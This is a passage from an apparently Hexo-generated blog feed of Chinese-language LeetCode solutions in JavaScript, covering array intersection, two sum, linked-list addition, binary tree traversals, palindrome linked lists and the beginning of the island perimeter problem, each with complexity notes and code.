<li>空间复杂度：O(n+m),其中n为数组1的长度，m为数组2的长度<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> intersection2 = <span class="function"><span class="keyword">function</span>(<span class="params">nums1, nums2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> set1 = <span class="keyword">new</span> <span class="built_in">Set</span>(nums1);</span><br><span class="line">    <span class="keyword">let</span> set2 = <span class="keyword">new</span> <span class="built_in">Set</span>(nums2);</span><br><span class="line">    <span class="keyword">return</span> set(set1,set2)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params">set1, set2</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">set1.size &gt; set2.size</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> set(set2, set1)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> result = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">    <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">const</span> num <span class="keyword">of</span> set1</span>)</span>&#123;</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">set2.has(num)</span>)</span>&#123;</span><br><span class="line">            result.add(num)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> [...result];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
]]></content>
      <categories>
        <category>数组算法</category>
      </categories>
      <tags>
        <tag>数组</tag>
        <tag>算法</tag>
        <tag>力扣每日一题</tag>
      </tags>
  </entry>
  <entry>
    <title>两数之和</title>
    <url>/2020/11/10/%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/</url>
    <content><![CDATA[<h1 id="给定一个整数数组-nums-和一个目标值-target，请你在该数组中找出和为目标值的那两个整数，并返回他们的数组下标"><a href="#给定一个整数数组-nums-和一个目标值-target，请你在该数组中找出和为目标值的那两个整数，并返回他们的数组下标" class="headerlink" title="给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那两个整数，并返回他们的数组下标"></a>给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那两个整数，并返回他们的数组下标</h1><h2 id="设置初始值"><a href="#设置初始值" class="headerlink" title="设置初始值"></a>设置初始值</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> nums = [<span class="number">2</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">15</span>];</span><br><span class="line"><span class="keyword">let</span> target = <span class="number">9</span>;</span><br></pre></td></tr></table></figure>

<h2 id="方法1-–-两个for循环判断相加值是否为target"><a href="#方法1-–-两个for循环判断相加值是否为target" class="headerlink" title="方法1 – 两个for循环判断相加值是否为target"></a>方法1 – 两个for循环判断相加值是否为target</h2><ul>
<li>时间复杂度：O(N^2)，其中 NN 是数组中的元素数量。最坏情况下数组中任意两个数都要被匹配一次。</li>
<li>空间复杂度：O(1)<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> twoSum = <span class="function"><span class="keyword">function</span>(<span class="params">nums, target</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = [];</span><br><span class="line">    <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++</span>)</span>&#123;</span><br><span class="line">        <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">let</span> j = (i+<span class="number">1</span>); j &lt; nums.length; j++</span>)</span>&#123;</span><br><span class="line">            <span class="function"><span class="title">if</span>(<span class="params">nums[i]+nums[j]==target</span>)</span>&#123;</span><br><span class="line">                arr.push(i);</span><br><span class="line">                arr.push(j);</span><br><span class="line">                <span class="keyword">break</span>;<span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="方法2-–-使用哈希表"><a href="#方法2-–-使用哈希表" class="headerlink" title="方法2 – 使用哈希表"></a>方法2 – 使用哈希表</h2><ol>
<li>创建一个哈希表，对于每一个 x，我们首先查询哈希表中是否存在 target - x，然后将 x 插入到哈希表中，即可保证不会让 x 和自己匹配</li>
</ol>
<ul>
<li>时间复杂度：O(N)，其中 N 是数组中的元素数量</li>
<li>空间复杂度：O(N)，其中 N 是数组中的元素数量<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> twoSum = <span class="function"><span class="keyword">function</span>(<span class="params">nums, target</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//新建map结构 &#123;num, index&#125; ,这里num储存target-nums[i]</span></span><br><span class="line">    <span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">    <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++</span>)</span>&#123;</span><br><span class="line">        <span class="comment">//如果map里存在target-nums[i],则返回target-nums[i]储存的i与此时的i</span></span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">map.has(nums[i])</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> [map.get(nums[i]),i]</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//如果不存在则设置&#123;target-nums[i],i&#125;</span></span><br><span class="line">            map.set(target-nums[i],i)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
]]></content>
      <categories>
        <category>数组算法</category>
      </categories>
      <tags>
        <tag>数组</tag>
        <tag>算法</tag>
        <tag>力扣每日一题</tag>
      </tags>
  </entry>
  <entry>
    <title>两数相加</title>
    <url>/2020/11/10/%E4%B8%A4%E6%95%B0%E7%9B%B8%E5%8A%A0/</url>
    <content><![CDATA[<h2 id="两数相加"><a href="#两数相加" class="headerlink" title="两数相加"></a>两数相加</h2><ul>
<li>给出两个非空的链表用来表示两个非负的整数。其中，它们各自的位数是按照 逆序 的方式存储的，并且它们的每个节点只能存储一位数字。如果，我们将这两个数相加起来，则会返回一个新的链表来表示它们的和</li>
</ul>
<h3 id="方法1-–-模拟"><a href="#方法1-–-模拟" class="headerlink" title="方法1 – 模拟"></a>方法1 – 模拟</h3><ul>
<li>我们同时遍历两个链表，逐位计算它们的和，并与当前位置的进位值相加。具体而言，如果当前两个链表处相应位置的数字为 n1,n2，进位值为 carry，则它们的和为 n1+n2+carry（sum）；其中，答案链表处相应位置的数字为 (sum % 10)，而新的进位值为 Int(sum / 10) 。如果两个链表的长度不同，则可以认为长度短的链表的后面有若干个 0 。此外，如果链表遍历结束后，有 carry &gt; 0，还需要在答案链表的后面附加一个节点，节点的值为 carry</li>
<li>时间复杂度：O(max(m,n))，其中 m,n 为两个链表的长度。我们要遍历两个链表的全部位置，而处理每个位置只需要 O(1) 的时间</li>
<li>空间复杂度：O(max(m,n))。答案链表的长度最多为较长链表的长度 +1</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> addTwoNumbers = <span class="function"><span class="keyword">function</span>(<span class="params">l1, l2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> head = <span class="literal">null</span>, tail = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">//初始化carry，用于记录进位</span></span><br><span class="line">    <span class="keyword">let</span> carry = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//循环直到两个链表都指向空</span></span><br><span class="line">    <span class="function"><span class="title">while</span>(<span class="params">l1 || l2</span>)</span>&#123;</span><br><span class="line">        <span class="comment">//如果l1存在则取l1的值，否则为0</span></span><br><span class="line">        <span class="keyword">let</span> num1 = l1 ? l1.val : <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//如果l2存在则取l2的值，否则为0</span></span><br><span class="line">        <span class="keyword">let</span> num2 = l2 ? l2.val : <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//将l1与l2与carry相加</span></span><br><span class="line">        <span class="keyword">let</span> sum = num1 + num2 + carry;</span><br><span class="line">        <span class="comment">//如果head为null，则将head指向tail并且给tail赋值，值为sum余10；</span></span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">!head</span>)</span>&#123;</span><br><span class="line">            head = tail = <span class="keyword">new</span> ListNode(sum % <span class="number">10</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//给tail.next赋值，值为sum余10,并让tail指向下一个节点</span></span><br><span class="line">            tail.next = <span class="keyword">new</span> ListNode(sum % <span class="number">10</span>);</span><br><span class="line">            tail = tail.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//取出sum的进位</span></span><br><span class="line">        carry = <span class="built_in">parseInt</span>(sum / <span class="number">10</span>)</span><br><span class="line">        <span class="comment">//如果l1存在则l1指向下一个节点</span></span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">l1</span>)</span>&#123;</span><br><span class="line">            l1 = l1.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//如果l2存在则l2指向下一个节点</span></span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">l2</span>)</span>&#123;</span><br><span class="line">            l2 = l2.next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//循环结束时如果进位大于0，则赋值给tail下一个节点</span></span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">carry &gt; <span class="number">0</span></span>)</span>&#123;</span><br><span class="line">        tail.next = <span class="keyword">new</span> ListNode(carry)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>链表算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>力扣每日一题</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title>二叉树前序遍历</title>
    <url>/2020/11/10/%E4%BA%8C%E5%8F%89%E6%A0%91%E5%89%8D%E5%BA%8F%E9%81%8D%E5%8E%86/</url>
    <content><![CDATA[<h2 id="二叉树前序遍历"><a href="#二叉树前序遍历" class="headerlink" title="二叉树前序遍历"></a>二叉树前序遍历</h2><ul>
<li>给定一个二叉树，返回它的 前序 遍历</li>
<li>二叉树的前序遍历：按照访问根节点——左子树——右子树的方式遍历这棵树，而在访问左子树或者右子树的时候，我们按照同样的方式遍历，直到遍历完整棵树<h3 id="初始化二叉树"><a href="#初始化二叉树" class="headerlink" title="初始化二叉树"></a>初始化二叉树</h3></li>
<li>[1,null,2,3]<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">TreeNode</span>(<span class="params">val, left, right</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.val = (val === <span class="literal">undefined</span> ? <span class="number">0</span> : val)</span><br><span class="line">    <span class="built_in">this</span>.left = (left === <span class="literal">undefined</span> ? <span class="literal">null</span> : left)</span><br><span class="line">    <span class="built_in">this</span>.right = (right === <span class="literal">undefined</span> ? <span class="literal">null</span> : right)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> root = <span class="keyword">new</span> TreeNode(<span class="number">1</span>);</span><br><span class="line">root.right = <span class="keyword">new</span> TreeNode(<span class="number">2</span>);</span><br><span class="line">root.right.left = <span class="keyword">new</span> TreeNode(<span class="number">3</span>);</span><br></pre></td></tr></table></figure>
<h3 id="方法1-–-递归"><a href="#方法1-–-递归" class="headerlink" title="方法1 – 递归"></a>方法1 – 递归</h3></li>
<li>按照定义，我们只要首先将 root 节点的值加入答案，然后递归调用 preorder(root.left) 来遍历 root 节点的左子树，最后递归调用 preorder(root.right) 来遍历 root 节点的右子树即可，递归终止的条件为碰到空节点</li>
<li>时间复杂度：O(n)，其中 n 是二叉树的节点数。每一个节点恰好被遍历一次</li>
<li>空间复杂度：O(n)，为递归过程中栈的开销，平均情况下为 O(log n)，最坏情况下树呈现链状，为 O(n)<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> preorderTraversal = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = [];</span><br><span class="line">    qianxu(root,arr);</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">qianxu</span>(<span class="params">root, arr</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">root !== <span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">        arr.push(root.val);</span><br><span class="line">        qianxu(root.left,arr);</span><br><span class="line">        qianxu(root.right,arr)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="方法2-–-迭代"><a href="#方法2-–-迭代" class="headerlink" title="方法2 – 迭代"></a>方法2 – 迭代</h3></li>
<li>设置栈，先进后出，出的根节点把左右子节点已进栈，首先添加右节点再添加左节点，这样可以让左节点先出栈</li>
<li>时间复杂度：O(n)，其中 n 是二叉树的节点数。每一个节点恰好被遍历一次</li>
<li>空间复杂度：O(n)，为迭代过程中显式栈的开销，平均情况下为 O(logn)，最坏情况下树呈现链状，为 O(n)<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> preorderTraversal2 = <span class="function"><span class="keyword">function</span> (<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> stack = [];</span><br><span class="line">    <span class="keyword">let</span> result = [];</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">root === <span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    stack.push(root);</span><br><span class="line">    <span class="function"><span class="title">while</span>(<span class="params">stack.length !== <span class="number">0</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> node = stack.pop();</span><br><span class="line">        result.push(node.val);</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">node.right</span>)</span>&#123;</span><br><span class="line">            stack.push(node.right)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">node.left</span>)</span>&#123;</span><br><span class="line">            stack.push(node.left)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
      <categories>
        <category>二叉树算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>力扣每日一题</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>二叉树后序遍历</title>
    <url>/2020/11/10/%E4%BA%8C%E5%8F%89%E6%A0%91%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86/</url>
    <content><![CDATA[<h2 id="二叉树后序遍历"><a href="#二叉树后序遍历" class="headerlink" title="二叉树后序遍历"></a>二叉树后序遍历</h2><ul>
<li>二叉树的后序遍历：按照访问左子树——右子树——根节点的方式遍历这棵树，而在访问左子树或者右子树的时候，我们按照同样的方式遍历，直到遍历完整棵树<h3 id="方法1-–-递归"><a href="#方法1-–-递归" class="headerlink" title="方法1 – 递归"></a>方法1 – 递归</h3></li>
<li>定义 postorder(root) 表示当前遍历到 root 节点的答案。按照定义，我们只要递归调用 postorder(root-&gt;left) 来遍历 root 节点的左子树，然后递归调用 postorder(root-&gt;right) 来遍历 root 节点的右子树，最后将 root 节点的值加入答案即可，递归终止的条件为碰到空节点</li>
<li>时间复杂度：O(n)，其中 nn 是二叉搜索树的节点数。每一个节点恰好被遍历一次。</li>
<li>空间复杂度：O(n)，为递归过程中栈的开销，平均情况下为 O(logn)，最坏情况下树呈现链状，为 O(n)<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> postorderTraversal = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = [];</span><br><span class="line">    dfs(arr, root);</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dfs</span>(<span class="params">arr, root</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">root</span>)</span>&#123;</span><br><span class="line">        dfs(arr, root.left);</span><br><span class="line">        dfs(arr, root.right);</span><br><span class="line">        arr.push(root.val);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="方法2-–-迭代"><a href="#方法2-–-迭代" class="headerlink" title="方法2 – 迭代"></a>方法2 – 迭代</h3></li>
<li>设置栈，先进后出，出的左节点把根节点和右节点加进栈，首先添加根节点再添加右节点，这样可以让右节点先出栈</li>
<li>时间复杂度：O(n)，其中 nn 是二叉搜索树的节点数。每一个节点恰好被遍历一次。</li>
<li>空间复杂度：O(n)，为迭代过程中显式栈的开销，平均情况下为 O(logn)，最坏情况下树呈现链状，为 O(n)</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> postorderTraversal = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> stack = [];</span><br><span class="line">    <span class="keyword">let</span> result = [];</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">root</span>)</span>&#123;</span><br><span class="line">        stack.push(root);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">while</span>(<span class="params">stack.length !== <span class="number">0</span></span>)</span>&#123;</span><br><span class="line">        root = stack.pop();</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">root</span>)</span>&#123;</span><br><span class="line">            stack.push(root);</span><br><span class="line">            stack.push(<span class="literal">null</span>)</span><br><span class="line">            <span class="function"><span class="title">if</span>(<span class="params">root.right</span>)</span>&#123;</span><br><span class="line">            stack.push(root.right);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="function"><span class="title">if</span>(<span class="params">root.left</span>)</span>&#123;</span><br><span class="line">            stack.push(root.left);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            result.push(stack.pop().val)</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>[1,null,2,3]</li>
<li>模拟运行</li>
<li>1</li>
<li>1,null,2</li>
<li>1,null,2,null,3</li>
<li>1,null,2,null,3,null</li>
<li>3,2,1</li>
</ul>
]]></content>
      <categories>
        <category>二叉树算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>力扣每日一题</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>判断是否是回文链表</title>
    <url>/2020/11/10/%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%98%AF%E5%9B%9E%E6%96%87%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<h2 id="如何判断链表是不是回文呢？"><a href="#如何判断链表是不是回文呢？" class="headerlink" title="如何判断链表是不是回文呢？"></a>如何判断链表是不是回文呢？</h2><ol>
<li>找到链表的中间节点</li>
<li>将链表后半部分反转</li>
<li>比较链表前半部分和后半部分是否相同</li>
</ol>
<h2 id="简单做一个链表"><a href="#简单做一个链表" class="headerlink" title="简单做一个链表"></a>简单做一个链表</h2><ul>
<li>链表结构为 “1-&gt;2-&gt;2-&gt;1”<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ListNode</span>(<span class="params">val</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.val = val;</span><br><span class="line">    <span class="built_in">this</span>.next = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> head = <span class="keyword">new</span> ListNode(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">head.next = <span class="keyword">new</span> ListNode(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">head.next.next = <span class="keyword">new</span> ListNode(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">head.next.next.next = <span class="keyword">new</span> ListNode(<span class="string">&#x27;1&#x27;</span>)</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="方法1-–-将值复制给数组然后切割数组比对"><a href="#方法1-–-将值复制给数组然后切割数组比对" class="headerlink" title="方法1 – 将值复制给数组然后切割数组比对"></a>方法1 – 将值复制给数组然后切割数组比对</h2><ul>
<li>此方法为首先的想法，之后发现空间复杂度与时间复杂度都较高，只做一种思想的参考</li>
</ul>
<ol>
<li>遍历链表，将所有的值放入数组中，之后将数组分为两部分</li>
<li>一个数组部分从index:0到index:Math:floor(arr.length/2)–数组长度一半向下取整</li>
<li>另一部分数组部分从index:Math:floor(arr.length/2)到末尾</li>
<li>其中如果数组长度为基数的话忽略最中间的值</li>
<li>将第二部分的数组翻转然后逐个比对值即可，值不同返回false，否则返回true<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> isPalindrome = <span class="function"><span class="keyword">function</span>(<span class="params">head</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = [];</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">head === <span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//将链表的值全部加入数组</span></span><br><span class="line">    <span class="function"><span class="title">while</span>(<span class="params">head !== <span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">        arr.push(head.val);</span><br><span class="line">        head = head.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//将数组划分为两部分</span></span><br><span class="line">    <span class="keyword">let</span> arr1 = arr.slice(<span class="number">0</span>,<span class="built_in">Math</span>.floor(arr.length/<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">let</span> arr2 = arr.slice(-(<span class="built_in">Math</span>.floor(arr.length/<span class="number">2</span>)))</span><br><span class="line">    <span class="comment">//翻转第二个数组</span></span><br><span class="line">    arr2 = arr2.reverse();</span><br><span class="line">    <span class="comment">//遍历判断两个数组内值是否相同</span></span><br><span class="line">    <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr1.length; i++</span>)</span>&#123;</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">arr1[i] !== arr2[i]</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="方法2-–-将值复制到数组中后用双指针法"><a href="#方法2-–-将值复制到数组中后用双指针法" class="headerlink" title="方法2 – 将值复制到数组中后用双指针法"></a>方法2 – 将值复制到数组中后用双指针法</h2></li>
<li>复制链表值到数组列表中</li>
<li>使用双指针法判断是否为回文</li>
<li>一个指针指向数组头部，一个指针指向数组尾部</li>
<li>两个指针同时向数组中间移动，停止条件为头部指针等于或大于尾部指针</li>
<li>如果指针指向的两个值不相等则返回false，否则返回true </li>
</ol>
<ul>
<li>时间复杂度：O(n)，其中 n 指的是链表的元素个数。<br>第一步： 遍历链表并将值复制到数组中，O(n)。<br>第二步：双指针判断是否为回文，执行了 O(n/2) 次的判断，即 O(n)。</li>
<li>总的时间复杂度：O(2n) = O(n)。</li>
<li>空间复杂度：O(n)，其中 n 指的是链表的元素个数，我们使用了一个数组列表存放链表的元素值</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> isPalindrome = <span class="function"><span class="keyword">function</span>(<span class="params">head</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = [];</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">head === <span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">while</span>(<span class="params">head !== <span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">        arr.push(head.val);</span><br><span class="line">        head = head.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//设置i为数组头部，j为数组尾部，循环条件为i&lt;j，i自增，j自减</span></span><br><span class="line">    <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">let</span> i = <span class="number">0</span>, j = arr.length - <span class="number">1</span>; i &lt; j; i++, j--</span>)</span>&#123;</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">arr[i] !== arr[j]</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="方法3-–-递归"><a href="#方法3-–-递归" class="headerlink" title="方法3 – 递归"></a>方法3 – 递归</h2><ol>
<li>定义一个frontPointer指向第一个节点</li>
<li>遍历recursivelyCheck函数使currentNode指向最后一个节点（判断currentNode是否为空，为空则返回true，在上一级则开始比对frontPointer与currentNode的值）</li>
<li>如果值相等则frontPointer指向下一个节点，currentNode返回到上一个节点</li>
<li>值不相等则层层返回false</li>
</ol>
<ul>
<li>时间复杂度：O(n)，其中 n 指的是链表的大小。</li>
<li>空间复杂度：O(n)，其中 n 指的是链表的大小。<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> frontPointer;</span><br><span class="line"><span class="keyword">var</span> isPalindrome = <span class="function"><span class="keyword">function</span>(<span class="params">head</span>)</span>&#123;</span><br><span class="line">    frontPointer = head;</span><br><span class="line">    <span class="keyword">return</span> recursivelyCheck(head)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> recursivelyCheck = <span class="function"><span class="keyword">function</span>(<span class="params">currentNode</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//判断传来的节点是否为空，为空则返回true返回上一级</span></span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">currentNode !== <span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//判断下一级是否已经比对完成，返回true则继续比对，返回false则继续向上级返回false</span></span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">!recursivelyCheck(currentNode.next)</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//比对此节点与frontPointer节点值是否相等</span></span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">currentNode.val !== frontPointer.val</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// frontPointer节点指向下一节点</span></span><br><span class="line">        frontPointer = frontPointer.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>链表算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>力扣每日一题</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title>岛屿的周长</title>
    <url>/2020/11/10/%E5%B2%9B%E5%B1%BF%E7%9A%84%E5%91%A8%E9%95%BF/</url>
    <content><![CDATA[<h2 id="岛屿的周长"><a href="#岛屿的周长" class="headerlink" title="岛屿的周长"></a>岛屿的周长</h2><ul>
<li>初始化数据<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> grid = [[<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>],[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>],[<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>],[<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>]]</span><br></pre></td></tr></table></figure>
<h3 id="方法1-–-暴力循环-四个方法判断-边界判断"><a href="#方法1-–-暴力循环-四个方法判断-边界判断" class="headerlink" title="方法1 – 暴力循环+四个方法判断+边界判断"></a>方法1 – 暴力循环+四个方法判断+边界判断</h3></li>
<li>对于一个陆地格子的每条边，它被算作岛屿的周长当且仅当这条边为网格的边界或者相邻的另一个格子为水域。 因此，我们可以遍历每个陆地格子，看其四个方向是否为边界或者水域，如果是则sum+1</li>
<li>时间复杂度：O(nm)，其中 nn 为网格的高度，m 为网格的宽度。我们需要遍历每个格子</li>
<li>空间复杂度：O(1)。只需要常数空间存放若干变量</li>
</ul>
